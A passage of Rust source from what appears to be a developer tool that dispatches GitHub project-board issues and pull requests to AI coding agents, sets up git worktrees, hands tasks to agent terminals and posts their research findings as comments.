        }
        Round::Implementation => {
            if let Err(err) = link_branch(job) {
                job.link_error = Some(format!("{err:#}"));
            }
        }
    }
    let skill = skill_in(&job.path, job.record.round.skill());
    let answers = job.answers_from.as_ref().map(|from| answers_for_task(job, from));
    write_task_file(&job.path, &task_file(&job.record, skill.as_deref(), answers.as_deref()))
}

fn link_branch(job: &mut Job) -> anyhow::Result<()> {
    let (repo, remote, branch) = (&job.repo, &job.remote, &job.branch);
    if job.record.kind != ItemKind::Issue {
        return Ok(());
    }
    let unlinked = "couldn't link its branch to the issue";
    if let Some(tip) = remote_branch_tip(repo, remote, branch).context(unlinked)? {
        let linked_here = job.record.linked_at.is_none()
            && tracks_same_name(repo, remote, branch)
            && tip == branch_base(repo, &job.path, remote).context(unlinked)?;
        if linked_here {
            job.record.linked_at = Some(tip);
        }
        return Ok(());
    }
    let repository = &job.record.repository;
    let can_write = match job.known_access.get(&access_key(repository, &job.viewer_login)) {
        Some(known) => *known,
        None => github::can_write(repository, &job.viewer_login).context(unlinked)?,
    };
    if !can_write {
        return Ok(());
    }
    let base = branch_base(repo, &job.path, remote).context(unlinked)?;
    github::create_linked_branch(&job.record.content_id, &base, branch).context(unlinked)?;
    job.record.linked_at = Some(base);
    track_remote_branch(repo, remote, branch)
        .context("linked its branch to the issue, but the local branch doesn't track it")
}

async fn on_own_thread<T: Send + 'static>(work: impl FnOnce() -> T + Send + 'static) -> Option<T> {
    let (done, result) = oneshot::channel();
    std::thread::Builder::new()
        .name("dispatch-setup".into())
        .spawn(move || {
            let _ = done.send(work());
        })
        .ok()?;
    result.await.ok()
}

fn skill_in(worktree: &Path, name: &str) -> Option<String> {
    let home = codescope_core::paths::home_dir();
    let skill = find_skill(worktree, home.as_deref(), name)?;
    let shown = match skill.strip_prefix(worktree) {
        Ok(relative) => relative.to_string_lossy().replace('\\', "/"),
        Err(_) => skill.to_string_lossy().into_owned(),
    };
    Some(shown)
}

fn refresh_start_head(job: &mut Job) {
    let Some(number) = job.record.pull_request.as_ref().map(|pr| pr.number) else {
        return;
    };
    let head = match github::fetch_pull_requests(&job.record.repository, &job.branch) {
        Ok(found) => found.into_iter().find(|pr| pr.number == number).map(|pr| pr.head_oid),
        Err(err) => {
            eprintln!("warning: couldn't read the head of PR #{number}: {err:#}");
            None
        }
    };
    if let (Some(head), Some(review)) = (head, job.record.review.as_mut()) {
        review.start_head = Some(head);
    }
}

fn claim_on_board(job: &Job, viewer_id: &str) -> Vec<String> {
    let mut errors = Vec::new();
    if let Some(content_id) = &job.assign_to
        && let Err(err) = github::assign(content_id, viewer_id)
    {
        errors.push(format!("couldn't assign it to you: {err:#}"));
    }
    if let Err(err) = github::set_status(&job.board, &job.record.item_id, &job.progress_column_id) {
        errors.push(format!("couldn't move it: {err:#}"));
    }
    if let Some(err) = &job.link_error {
        errors.push(err.clone());
    }
    errors
}

impl AppShell {
    /// The read the board poll is about to make.
    pub(crate) fn board_read_input(&mut self, cx: &App) -> ReadInput {
        let state = &self.board.dispatch;
        let local = self.local_projects(cx);
        let read_projects: Vec<(&str, &str)> = state
            .remotes
            .iter()
            .map(|r| (r.project_id.as_str(), r.path.as_str()))
            .collect();
        let same_projects = read_projects.len() == local.len()
            && local.iter().all(|(id, path)| read_projects.contains(&(id.as_str(), path.as_str())));
        let remotes_due = !same_projects
            || state.remotes_read_at.is_none_or(|at| at.elapsed() >= REMOTES_MAX_AGE);
        let discussions = self
            .dispatch_records(cx)
            .into_iter()
            .filter_map(|(_, _, _, record)| {
                let posted = record.findings.clone()?;
                let waiting = record.round == Round::Research
                    && posted.outcome == Outcome::DecisionPoints;
                waiting.then_some(DiscussionRead {
                    content_id: record.content_id,
                    repository: record.repository,
                    findings_url: posted.comment_url,
                    since: record.trigger_at,
                })
            })
            .collect();
        ReadInput {
            boards: self
                .settings
                .boards
                .iter()
                .map(|b| (b.url.clone(), b.columns.clone()))
                .collect(),
            viewer: state
                .viewer_read_at
                .is_some_and(|at| at.elapsed() < VIEWER_MAX_AGE)
                .then(|| state.viewer.clone())
                .flatten(),
            known_access: fresh_access(&state.access),
            projects: remotes_due.then_some(local),
            discussions,
            workflows_due: self
                .settings
                .boards
                .iter()
                .filter(|b| {
                    let read = self.board.reads_by_url.get(&b.url);
                    let warned = read
                        .and_then(|read| read.workflows.as_deref())
                        .is_some_and(moves_back_from_review);
                    let read_at = read.and_then(|read| read.workflows_read_at);
                    warned || read_at.is_none_or(|at| at.elapsed() >= WORKFLOWS_MAX_AGE)
                })
                .map(|b| b.url.clone())
                .collect(),
        }
    }

    /// The projects as the sidebar has them, which follows its own edits as well as this shell's.
    fn current_projects<'a>(&self, cx: &'a App) -> &'a ProjectsConfig {
        self.sidebar.read(cx).projects()
    }

    fn local_projects(&self, cx: &App) -> Vec<(String, String)> {
        self.current_projects(cx)
            .projects
            .iter()
            .filter(|p| p.kind == ProjectKind::Local && !p.path.is_empty())
            .map(|p| (p.id.clone(), p.path.clone()))
            .collect()
    }

    /// Take in what a board read found besides the boards themselves.
    pub(crate) fn accept_dispatch_read(&mut self, output: &mut ReadOutput) {
        let state = &mut self.board.dispatch;
        match output.viewer.take() {
            Some(Ok(viewer)) => {
                let switched = state
                    .viewer
                    .as_ref()
                    .is_some_and(|before| !before.login.eq_ignore_ascii_case(&viewer.login));
                if switched {
                    state.access.clear();
                    state.holds.clear();
                    state.failed.clear();
                }
                state.viewer = Some(viewer);
                state.viewer_read_at = Some(Instant::now());
                state.viewer_error = None;
            }
            Some(Err(err)) => state.viewer_error = Some(err),
            None => {}
        }
        state.keep_access(std::mem::take(&mut output.access));
        if let Some(discussions) = output.discussions.take() {
            state.discussions.extend(discussions);
        }
        if let Some(remotes) = output.remotes.take() {
            state.remotes = remotes;
            state.remotes_read_at = Some(Instant::now());
        }
    }

    pub(crate) fn dispatch_error(&self) -> Option<&str> {
        self.board.dispatch.viewer_error.as_deref()
    }

    fn dispatch_records(
        &self,
        cx: &App,
    ) -> Vec<(String, PathBuf, Option<String>, WorktreeDispatch)> {
        self.current_projects(cx)
            .projects
            .iter()
            .flat_map(|p| {
                p.worktrees.iter().filter_map(|wt| {
                    let dispatch = wt.dispatch.clone()?;
                    Some((p.id.clone(), PathBuf::from(&wt.path), wt.branch.clone(), dispatch))
                })
            })
            .collect()
    }

    fn place_of(
        &self,
        board_url: &str,
        item: &BoardItem,
        head: Option<&PullRequestHead>,
        cx: &App,
    ) -> Option<Place> {
        let number = item.number?;
        let new_branch = match item.kind {
            ItemKind::PullRequest => head.map(|head| {
                if head.is_cross_repository {
                    fork_branch(number, head)
                } else {
                    head.branch.clone()
                }
            }),
            ItemKind::Issue | ItemKind::Draft => Some(branch_name(number, &item.title)),
        };
        let existing = self
            .dispatch_records(cx)
            .into_iter()
            .find(|(_, _, _, r)| r.board_url == board_url && r.item_id == item.id);
        if let Some((_, path, branch, _)) = existing {
            return Some(Place {
                create: false,
                path,
                branch: branch.or(new_branch)?,
            });
        }
        let remotes = &self.board.dispatch.remotes;
        let (matched, _) = *projects_for_repository(remotes, item.repository.as_deref()?).first()?;
        let project = self.current_projects(cx).project(&matched.project_id)?;
        let branch = new_branch?;
        let folder = sanitize_branch_to_folder(&branch);
        Some(Place {
            create: true,
            path: PathBuf::from(project.worktree_root_path()).join(folder),
            branch,
        })
    }

    fn running_dispatches(&self, cx: &App) -> usize {
        let on_board = self
            .dispatch_records(cx)
            .iter()
            .filter(|(_, _, _, record)| record.findings.is_none())
            .filter(|(_, _, _, record)| {
                let Some(read) = self.board.reads_by_url.get(&record.board_url) else {
                    return false;
                };
                let settings = self.settings.boards.iter().find(|b| b.url == record.board_url);
                let (Some(board), Some(settings)) = (&read.last_good, settings) else {
                    return false;
                };
                let change = read
                    .triggers
                    .as_ref()
                    .and_then(|t| t.changes.get(&record.content_id));
                board
                    .items
                    .iter()
                    .find(|item| item.id == record.item_id)
                    .is_some_and(|item| {
                        let mapping = effective_mapping(board, &settings.columns);
                        counts_towards_limit(board, &mapping, item, record, change)
                    })
            })
            .count();
        on_board + self.board.dispatch.starting.len()
    }

    /// Decide every item in a trigger column and start the rounds that are due.
    pub(crate) fn run_dispatch(&mut self, window: &mut Window, cx: &mut Context<Self>) {
        let Some(viewer) = self.board.dispatch.viewer.clone() else {
            return;
        };
        let records = self.dispatch_records(cx);
        let mut running = self.running_dispatches(cx);
        let limit = self.settings.dispatch_limit;
        let now = codescope_core::time::now_iso8601();
        let mut holds = HashMap::new();
        let mut seen = HashSet::new();
        let mut decided = HashSet::new();
        let mut starts = Vec::new();
        let state = &self.board.dispatch;
        for settings in &self.settings.boards {
            let Some(read) = self.board.reads_by_url.get(&settings.url) else {
                continue;
            };
            let (Some(board), Some(triggers)) = (&read.last_good, &read.triggers) else {
                continue;
            };
            let mapping = effective_mapping(board, &settings.columns);
            for item in &board.items {
                seen.insert(item.id.clone());
                if state.starting.contains_key(&item.id) {
                    continue;
                }
                let worktree = records
                    .iter()
                    .find(|(_, _, _, r)| r.board_url == settings.url && r.item_id == item.id);
                let record = worktree.map(|(_, _, _, r)| r);
                let change = item.content_id.as_ref().and_then(|id| triggers.changes.get(id));
                let linked = item
                    .content_id
                    .as_ref()
                    .and_then(|id| triggers.linked.get(id))
                    .map_or(&[][..], Vec::as_slice);
                let head = item.content_id.as_ref().and_then(|id| triggers.heads.get(id));
                let dispatches = records.iter().map(|(_, _, branch, r)| (branch.as_deref(), r));
                let opener = opened_by(item, head, dispatches);
                let mover_can_write = change
                    .and_then(|c| mover_to_check(item, c, &viewer.login))
                    .zip(item.repository.as_deref())
                    .and_then(|(login, repository)| {
                        let known = state.access.get(&access_key(repository, login));
                        usable_access(known, Instant::now())
                    });
                let facts = Facts {
                    viewer: &viewer.login,
                    change,
                    mover_can_write,
                    board_added_at: &settings.added_at,
                    now: &now,
                    projects: item
                        .repository
                        .as_deref()
                        .map(|r| projects_for_repository(&state.remotes, r).len())
                        .unwrap_or(0),
                    dispatch: record,
                    pull_request: own_pull_request(record, state.watches.get(&item.id)),
                    linked,
                    branch: worktree.and_then(|(_, _, branch, _)| branch.as_deref()),
                    head,
                    opened_by: opener,
                    fork_confirmed: state.fork_confirmed.get(&item.id).map(String::as_str),
                    running,
                    limit,
                };
                let decision = decide(board, &mapping, item, &facts);
                if decision.is_some() {
                    decided.insert(item.id.clone());
                }
                match decision {
                    None => {}
                    Some(Err(hold)) => {
                        holds.insert(item.id.clone(), hold);
                    }
                    Some(Ok(round)) => {
                        let Some(change) = change else { continue };
                        let failed_before = state
                            .failed
                            .get(&item.id)
                            .is_some_and(|(at, _)| *at == change.created_at);
                        if failed_before {
                            continue;
                        }
                        let target = self
                            .place_of(&settings.url, item, head, cx)
                            .map(|place| self.handover_target(&place.path, cx));
                        if let Some(HandoverTarget::Wait(hold)) = target {
                            holds.insert(item.id.clone(), hold);
                            continue;
                        }
                        running += 1;
                        starts.push(Start {
                            board: board.clone(),
                            board_url: settings.url.clone(),
                            item: item.clone(),
                            head: head.cloned(),
                            round,
                            trigger_at: change.created_at.clone(),
                        });
                    }
                }
            }
        }
        let state = &mut self.board.dispatch;
        state.holds.retain(|id, _| !seen.contains(id));
        state.holds.extend(holds);
        state.failed.retain(|id, _| decided.contains(id) || !seen.contains(id));
        for start in starts {
            self.start_dispatch(start, &viewer, window, cx);
        }
    }

    fn fail_dispatch(
        &mut self,
        item_id: &str,
        number: u32,
        trigger_at: &str,
        message: String,
        cx: &mut Context<Self>,
    ) {
        let state = &mut self.board.dispatch;
        state.starting.remove(item_id);
        state.setting_up.remove(item_id);
        state
            .failed
            .insert(item_id.to_string(), (trigger_at.to_string(), message.clone()));
        self.push_toast(
            ToastKind::Err,
            format!("Couldn't start #{number}"),
            Some(message.into()),
            cx,
        );
    }

    fn start_dispatch(
        &mut self,
        start: Start,
        viewer: &Viewer,
        window: &mut Window,
        cx: &mut Context<Self>,
    ) {
        let Start {
            board,
            board_url,
            item,
            head,
            round,
            trigger_at,
        } = start;
        let (Some(number), Some(repository), Some(content_id), Some(url)) = (
            item.number,
            item.repository.clone(),
            item.content_id.clone(),
            item.url.clone(),
        ) else {
            return;
        };
        let matched = projects_for_repository(&self.board.dispatch.remotes, &repository)
            .first()
            .map(|(project, remote)| {
                let url = project
                    .remotes
                    .iter()
                    .find(|(name, _)| name.as_str() == *remote)
                    .map(|(_, url)| url.clone())
                    .unwrap_or_default();
                (project.project_id.clone(), remote.to_string(), url)
            });
        let Some((project_id, remote, remote_url)) = matched else {
            return;
        };
        let Some(project) = self.current_projects(cx).project(&project_id).cloned() else {
            return;
        };
        let mapping = self
            .settings
            .boards
            .iter()
            .find(|b| b.url == board_url)
            .map(|b| effective_mapping(&board, &b.columns))
            .unwrap_or_default();
        let Some(progress_column_id) =
            mapped_column(&board, &mapping, round.progress_role()).map(|c| c.id.clone())
        else {
            return;
        };

        let profile = self.project_agent(&project);
        let command = profile.as_ref().and_then(|profile| {
            codescope_core::build_new_session_auto_type(profile)
                .and_then(|launch| launch_with_task(&launch, &task_message(item.kind, number)))
        });
        let (Some(profile), Some(command)) = (profile, command) else {
            let message = "The project's agent can't be handed a task yet. Claude Code, Codex, \
                           Gemini CLI, Copilot and Pi can."
                .to_string();
            self.fail_dispatch(&item.id, number, &trigger_at, message, cx);
            return;
        };

        let Some(Place { create, path, branch }) =
            self.place_of(&board_url, &item, head.as_ref(), cx)
        else {
            return;
        };
        let pending = if create {
            let path = path.to_string_lossy().into_owned();
            let begun = self.sidebar.update(cx, |sidebar, cx| {
                cx.notify();
                sidebar.pending_worktrees_mut().begin(&project_id, &path, &branch)
            });
            match begun {
                Ok(id) => Some(id),
                Err(err) => {
                    self.fail_dispatch(&item.id, number, &trigger_at, err.to_string(), cx);
                    return;
                }
            }
        } else {
            None
        };
        let previous = self
            .dispatch_records(cx)
            .into_iter()
            .map(|(_, _, _, record)| record)
            .find(|r| r.board_url == board_url && r.item_id == item.id);
        let answers_from = previous.as_ref().and_then(|previous| {
            let posted = previous.findings.clone()?;
            let after_research = previous.round == Round::Research && round != Round::Research;
            after_research.then(|| AnswersFrom {
                findings_url: posted.comment_url,
                since: previous.trigger_at.clone(),
            })
        });
        let watch = self.board.dispatch.watches.get(&item.id);
        let open = watch
            .and_then(|w| w.pull_request.as_ref())
            .filter(|pr| pr.state == PullRequestState::Open);
        let posted = previous
            .as_ref()
            .and_then(|previous| previous.pull_request.clone())
            .or_else(|| watch.and_then(|w| w.reported.clone()));
        let pull_request = match item.kind {
            ItemKind::PullRequest => Some(PostedPullRequest {
                number,
                url: url.clone(),
                comment_url: String::new(),
                in_review: false,
                reported_at: None,
            }),
            ItemKind::Issue | ItemKind::Draft => carried_pull_request(round, posted, open),
        };
        let review = (round == Round::Review).then(|| ReviewRound {
            start_head: open.map(|pr| pr.head_oid.clone()),
            ..ReviewRound::default()
        });
        let fork = head
            .as_ref()
            .filter(|head| head.is_cross_repository)
            .map(|head| fork_push(head, &remote_url));
        let mut title = codescope_core::TabTitle::project(project.name.clone());
        title.set_branch(&branch);
        let launch = Launch {
            project_id: project_id.clone(),
            title,
            agent_id: profile.id.clone(),
            command,
        };
        let job = Job {
            repo: PathBuf::from(&project.path),
            path,
            branch,
            remote,
            create,
            pending,
            record: WorktreeDispatch {
                board_url,
                item_id: item.id.clone(),
                content_id: content_id.clone(),
                kind: item.kind,
                repository,
                number,
                title: item.title.clone(),
                url,
                round,
                trigger_at: trigger_at.clone(),
                findings: None,
                pull_request,
                review,
                fork,
                repair: None,
                forwarded: None,
                kept: None,
                linked_at: previous.as_ref().and_then(|p| p.linked_at.clone()),
            },
            assign_to: item.assignees.is_empty().then_some(content_id),
            board,
            progress_column_id,
            answers_from,
            known_access: fresh_access(&self.board.dispatch.access),
            viewer_login: viewer.login.clone(),
            link_error: None,
        };
        self.board.dispatch.readied.remove(&item.id);
        self.board.dispatch.fork_confirmed.remove(&item.id);
        self.board.dispatch.starting.insert(item.id.clone(), round);
        self.board.dispatch.failed.remove(&item.id);
        cx.notify();

        let viewer_id = viewer.id.clone();
        let item_id = item.id.clone();
        cx.spawn_in(window, async move |this, cx| {
            let (job, created) = cx
                .background_spawn(async move {
                    let created = create_worktree(&job).map_err(|err| format!("{err:#}"));
                    (job, created)
                })
                .await;
            let Ok(Some(job)) =
                this.update(cx, |this, cx| this.record_worktree_created(job, created, cx))
            else {
                return;
            };
            let set_up = on_own_thread(move || {
                let mut job = job;
                let prepared = set_up_worktree(&mut job).map_err(|err| format!("{err:#}"));
                (job, prepared)
            })
            .await;
            let Some((job, prepared)) = set_up else {
                let _ = this.update(cx, |this, cx| {
                    let message = "its setup stopped unexpectedly".to_string();
                    this.fail_dispatch(&item_id, number, &trigger_at, message, cx);
                });
                return;
            };
            let Ok(Some(job)) = this.update_in(cx, |this, window, cx| {
                this.record_dispatch_start(job, launch, prepared, window, cx)
            }) else {
                return;
            };
            let (job, board_errors) = cx
                .background_spawn(async move {
                    let errors = claim_on_board(&job, &viewer_id);
                    (job, errors)
                })
                .await;
            let _ = this.update(cx, |this, cx| {
                this.report_dispatch_start(&job.record, board_errors, cx);
            });
        })
        .detach();
    }

    fn record_worktree_created(
        &mut self,
        mut job: Job,
        created: Result<(), String>,
        cx: &mut Context<Self>,
    ) -> Option<Job> {
        if let Some(id) = job.pending.take() {
            self.sidebar.update(cx, |sidebar, cx| {
                sidebar.pending_worktrees_mut().finish(id);
                sidebar.note_worktree_edit();
                cx.notify();
            });
        }
        let record = &job.record;
        if let Err(message) = created {
            self.fail_dispatch(&record.item_id, record.number, &record.trigger_at, message, cx);
            return None;
        }
        if let Some(why) = self.unwanted_start(record) {
            self.drop_start(record, why, cx);
            return None;
        }
        if job.create {
            self.board.dispatch.setting_up.insert(record.item_id.clone());
            cx.notify();
        }
        Some(job)
    }

    fn unwanted_start(&self, record: &WorktreeDispatch) -> Option<&'static str> {
        let Some(settings) = self.settings.boards.iter().find(|b| b.url == record.board_url) else {
            return Some("Its board was removed.");
        };
        let read = self.board.reads_by_url.get(&record.board_url)?;
        let board = read.last_good.as_ref()?;
        let mapping = effective_mapping(board, &settings.columns);
        let last_move = read.triggers.as_ref().and_then(|t| t.changes.get(&record.content_id));
        let (item_id, round, trigger_at) = (&record.item_id, record.round, &record.trigger_at);
        let wanted = start_still_wanted(board, &mapping, item_id, round, last_move, trigger_at);
        (!wanted).then_some("It moved or closed while its round was being prepared.")
    }

    fn drop_start(&mut self, record: &WorktreeDispatch, why: &'static str, cx: &mut Context<Self>) {
        self.board.dispatch.starting.remove(&record.item_id);
        let round = record.round.label().to_lowercase();
        let title = format!("Didn't start {round} on #{}", record.number);
        self.push_toast(ToastKind::Info, title, Some(why.into()), cx);
        cx.notify();
    }

    /// Keep the started round on the worktree's row and hand the session its task; the job comes
    /// back to be claimed on the board only once that is saved.
    fn record_dispatch_start(
        &mut self,
        job: Job,
        launch: Launch,
        prepared: Result<(), String>,
        window: &mut Window,
        cx: &mut Context<Self>,
    ) -> Option<Job> {
        let record = &job.record;
        self.board.dispatch.setting_up.remove(&record.item_id);
        if let Err(message) = prepared {
            self.fail_dispatch(&record.item_id, record.number, &record.trigger_at, message, cx);
            return None;
        }
        if let Some(why) = self.unwanted_start(record) {
            self.drop_start(record, why, cx);
            return None;
        }
        let terminal = match self.handover_target(&job.path, cx) {
            HandoverTarget::Type(terminal) => Some(terminal),
            HandoverTarget::NewTab => None,
            HandoverTarget::Wait(hold) => {
                let state = &mut self.board.dispatch;
                state.starting.remove(&record.item_id);
                state.holds.insert(record.item_id.clone(), hold);
                cx.notify();
                return None;
            }
        };
        let saved =
            self.save_record(&launch.project_id, &job.path, &job.branch, record.clone(), cx);
        if let Err(message) = saved {
            self.fail_dispatch(&record.item_id, record.number, &record.trigger_at, message, cx);
            return None;
        }
        self.board.dispatch.starting.remove(&record.item_id);
        self.board.dispatch.seen_from_start.insert(round_key(record));
        let task = task_message(record.kind, record.number);
        self.hand_over(&job.path, terminal, launch, task, window, cx);
        cx.notify();
        Some(job)
    }

    fn report_dispatch_start(
        &mut self,
        record: &WorktreeDispatch,
        board_errors: Vec<String>,
        cx: &mut Context<Self>,
    ) {
        let started = format!("{} started on #{}", record.round.label(), record.number);
        if board_errors.is_empty() {
            self.push_toast(ToastKind::Ok, started, Some(record.title.clone().into()), cx);
        } else {
            let detail = format!("The board isn't up to date: {}", board_errors.join("; "));
            self.push_toast(ToastKind::Err, started, Some(detail.into()), cx);
        }
        cx.notify();
    }

    /// Give the session on `path` its task: typed into `terminal`, where Claude Code waits for a
    /// prompt, or else in a new tab. Focus stays where it was.
    fn hand_over(
        &mut self,
        path: &Path,
        terminal: Option<Entity<TerminalView>>,
        launch: Launch,
        task: String,
        window: &mut Window,
        cx: &mut Context<Self>,
    ) {
        if let Some(terminal) = terminal {
            Self::submit_line(&terminal, task, cx);
            return;
        }
        let before = self
            .groups
            .get(self.focused_group)
            .map(|g| (self.focused_group, g.active_tab));
        let focused = window.focused(cx);
        self.spawn_tab_in(
            Some(path.to_path_buf()),
            Some(launch.title),
            Some(launch.command.into()),
            Some(launch.agent_id.into()),
            None,
            None,
            window,
            cx,
        );
        if let Some((group, tab)) = before {
            self.activate_tab(group, tab, window, cx);
        }
        if let Some(focused) = focused {
            focused.focus(window);
        }
    }

    fn tabs_on(&self, path: &Path) -> Vec<&super::Tab> {
        let wanted = path.to_string_lossy();
        self.groups
            .iter()
            .flat_map(|g| g.tabs.iter())
            .filter(|t| t.remote_project_id.is_none())
            .filter(|t| {
                t.working_directory
                    .as_deref()
                    .is_some_and(|wd| paths_match(&wd.to_string_lossy(), &wanted))
            })
            .collect()
    }

    fn tab_states(&self, tabs: &[&super::Tab], path: &Path, cx: &App) -> Vec<TabAtHandover> {
        if tabs.is_empty() {
            return Vec::new();
        }
        let wanted = path.to_string_lossy();
        let table = process_tree::process_table();
        let sessions = live_session::default_sessions_dir();
        tabs.iter()
            .map(|tab| {
                let terminal = tab.terminal.read(cx);
                let shell = terminal.child_pid();
                let running = running_under(shell, &table);
                let claude = running.as_deref().and_then(|running| {
                    live_session::process_for_pids(sessions.as_deref()?, running, &wanted)
                });
                let relaunched = self.claude_updates.relaunched_at(tab.id);
                let launched_lately = tab.spawned_instant.elapsed() < LAUNCH_GRACE
                    || relaunched.is_some_and(|at| at.elapsed() < LAUNCH_GRACE);
                tab_at_handover(&TabProbe {
                    restarting: self.claude_updates.is_restarting(tab.id),
                    launched_lately,
                    shell_gone: shell_gone(shell, &table),
                    running: running.as_deref(),
                    claude_idle: claude.as_ref().and_then(|claude| claude.reports_idle()),
                    stopped: claude.is_some_and(|claude| process_tree::is_stopped(claude.pid)),
                    typed: terminal.typed_since_submit(),
                })
            })
            .collect()
    }

    /// Where a task for the worktree at `path` goes: into a tab where Claude Code waits for a
    /// prompt, into a new tab when nothing runs there, or nowhere yet, with the reason.
    fn handover_target(&self, path: &Path, cx: &App) -> HandoverTarget {
        let on_path = self.tabs_on(path);
        if on_path.is_empty() {
            return HandoverTarget::NewTab;
        }
        match handover_to(&self.tab_states(&on_path, path, cx)) {
            Handover::Type(index) => HandoverTarget::Type(on_path[index].terminal.clone()),
            Handover::NewTab => HandoverTarget::NewTab,
            Handover::Wait(hold) => HandoverTarget::Wait(hold),
        }
    }

    fn submit_line(terminal: &Entity<TerminalView>, line: String, cx: &mut Context<Self>) {
        let terminal = terminal.downgrade();
        cx.spawn(async move |_, cx| {
            let _ = terminal.update(cx, |term, _| term.write_input(line.into_bytes()));
            cx.background_executor().timer(SUBMIT_AFTER_TYPING).await;
            let _ = terminal.update(cx, |term, _| term.write_input(&b"\r"[..]));
        })
        .detach();
    }

    fn read_board(&self, board_url: &str) -> Option<(&Board, ColumnMapping)> {
        let board = self.board.reads_by_url.get(board_url)?.last_good.as_ref()?;
        let settings = self.settings.boards.iter().find(|b| b.url == board_url)?;
        Some((board, effective_mapping(board, &settings.columns)))
    }

    /// Post the findings of every research round whose sessions are done, or tell the session
    /// what to fix first while the item is still in Researching.
    pub(crate) fn collect_findings(&mut self, cx: &mut Context<Self>) {
        let records = self.dispatch_records(cx);
        let awaiting: HashSet<RoundKey> = records
            .iter()
            .filter(|(_, _, _, record)| record.awaits_findings())
            .map(|(_, _, _, record)| round_key(record))
            .collect();
        let state = &mut self.board.dispatch;
        state.reminders.retain(|key, _| awaiting.contains(key));
        state.post_errors.retain(|key, _| awaiting.contains(key));
        state.findings_announced.retain(|key| awaiting.contains(key));
        let held_before = std::mem::take(&mut state.findings_held);

        for (_, path, _, record) in records {
            let key = round_key(&record);
            let state = &self.board.dispatch;
            let waiting_to_retry = state
                .post_errors
                .get(&key)
                .is_some_and(|(at, _)| at.elapsed() < POST_RETRY);
            if !awaiting.contains(&key) || state.posting.contains(&key) || waiting_to_retry {
                continue;
            }
            let Some((board, mapping)) = self.read_board(&record.board_url) else {
                continue;
            };
            let researching = board
                .items
                .iter()
                .find(|item| item.id == record.item_id)
                .and_then(|item| board.role_of(item, &mapping))
                == Some(ColumnRole::Researching);
            let board = board.clone();
            let Some(file) = read_findings(&path) else {
                continue;
            };
            let remind = match self.session_at(&path, cx) {
                SessionAt::Working => continue,
                SessionAt::Held(by) => {
                    self.board.dispatch.findings_held.insert(key, by);
                    continue;
                }
                SessionAt::Done(_) if !researching => Remind::Nothing,
                SessionAt::Done(remind) => remind,
            };
            match file.check() {
                Ok((text, findings)) => {
                    let body = comment_body(text, &findings, record.kind);
                    let posting = Posting {
                        points: findings.decision_points.clone(),
                        record,
                        path,
                        outcome: findings.outcome(),
                    };
                    self.post_findings(posting, body, board, mapping, cx);
                }
                Err(problems) => {
                    self.remind(&record, &path, file.stamp, remind, &problems, cx);
                }
            }
        }
        if self.board.dispatch.findings_held != held_before {
            cx.notify();
        }
    }

    fn session_at(&self, path: &Path, cx: &App) -> SessionAt {
        let tabs = self.tabs_on(path);
        let states = self.tab_states(&tabs, path, cx);
        let probed: Vec<(TabAtHandover, Turn)> = tabs
            .iter()
            .zip(states)
            .map(|(tab, state)| (state, self.turn(tab)))
            .collect();
        match findings_gate(&probed) {
            FindingsGate::Wait => SessionAt::Working,
            FindingsGate::Held(by) => SessionAt::Held(by),
            FindingsGate::Settled(RemindBy::Typing(index)) => {
                SessionAt::Done(Remind::Typing(tabs[index].terminal.clone()))
            }
            FindingsGate::Settled(RemindBy::Notice) => SessionAt::Done(Remind::Notice),
        }
    }

    fn turn(&self, tab: &super::Tab) -> Turn {
        let snapshot = tab.adopted_session_id.as_deref().and_then(|sid| self.telemetry_for(sid));
        snapshot.map_or(Turn::Unknown, |snap| turn_of(snap.state, snap.quiet_timeout))
    }

    fn telemetry_at(&self, path: &Path) -> Option<TelemetrySnapshot> {
        let mut sessions = self.tabs_on(path).into_iter().filter_map(|tab| {
            tab.adopted_session_id.as_deref().and_then(|sid| self.telemetry_for(sid))
        });
        sessions.next()
    }

    fn tab_title_at(&self, path: &Path) -> Option<SharedString> {
        self.tabs_on(path).first().map(|tab| tab.title.clone())
    }

    fn remind(
        &mut self,
        record: &WorktreeDispatch,
        path: &Path,
        file: FileStamp,
        remind: Remind,
        problems: &[Problem],
        cx: &mut Context<Self>,
    ) {
        let reminders = &mut self.board.dispatch.reminders;
        let reminder = reminders.entry(round_key(record)).or_default();
        let due = reminder.note(problems, file, !matches!(remind, Remind::Nothing));
        cx.notify();
        if !due {
            return;
        }
        let listed = &reminder.problems;
        let notice = Notice {
            title: format!("Findings on #{} can't be posted yet", record.number),
            detail: format!("{listed}. Fix {FINDINGS_FILE}, or have its session fix it."),
        };
        self.send_reminder(remind, problems_message(problems), notice, path, cx);
    }

    fn remind_reply(
        &mut self,
        record: &WorktreeDispatch,
        path: &Path,
        file: FileStamp,
        remind: Remind,
        problems: &[Problem],
        cx: &mut Context<Self>,
    ) {
        let Some(watch) = self.board.dispatch.watches.get_mut(&record.item_id) else {
            return;
        };
        let reminder = watch.reply_reminder.get_or_insert_with(Reminder::default);
        let due = reminder.note(problems, file, !matches!(remind, Remind::Nothing));
        cx.notify();
        if !due {
            return;
        }
        let listed = &reminder.problems;
        let notice = Notice {
            title: format!("The reply on #{} can't be posted yet", record.number),
            detail: format!("{listed}. Fix {REPLY_FILE}, or have its session fix it."),
        };
        self.send_reminder(remind, reply_problems_message(problems), notice, path, cx);
    }

    fn send_reminder(
        &mut self,
        remind: Remind,
        message: String,
        notice: Notice,
        path: &Path,
        cx: &mut Context<Self>,
    ) {
        match remind {
            Remind::Typing(terminal) => Self::submit_line(&terminal, message, cx),
            Remind::Notice => {
                let Notice { title, detail } = notice;
                self.push_toast(ToastKind::Err, title.clone(), Some(detail.clone().into()), cx);
                let tab_title = self.tab_title_at(path);
                let kind = NotificationKind::SessionWaiting;
                self.push_notification(kind, title, detail, tab_title, cx);
            }
            Remind::Nothing => {}
        }
    }

    fn post_findings(
        &mut self,
        posting: Posting,
        body: String,
        board: Board,
        mapping: ColumnMapping,
        cx: &mut Context<Self>,
    ) {
        let record = &posting.record;
        let item_id = record.item_id.clone();
        let content_id = record.content_id.clone();
        let since = record.trigger_at.clone();
        self.board.dispatch.posting.insert(round_key(record));
        cx.notify();

        cx.spawn(async move |this, cx| {
            let result = cx
                .background_spawn(async move {
                    let failed = |err: anyhow::Error| format!("{err:#}");
                    let before = github::before_posting(&item_id, &content_id, &since, &body)
                        .map_err(failed)?;
                    let url = match before.posted {
                        Some(url) => url,
                        None => github::add_comment(&content_id, &body).map_err(failed)?.url,
                    };
                    let role = before
                        .column_id
                        .as_deref()
                        .and_then(|id| board.role_of_column(id, &mapping));
                    let move_error = if !moves_to_needs_decision(role) {
                        None
                    } else {
                        match mapped_column(&board, &mapping, ColumnRole::NeedsDecision) {
                            Some(column) => github::set_status(&board, &item_id, &column.id)
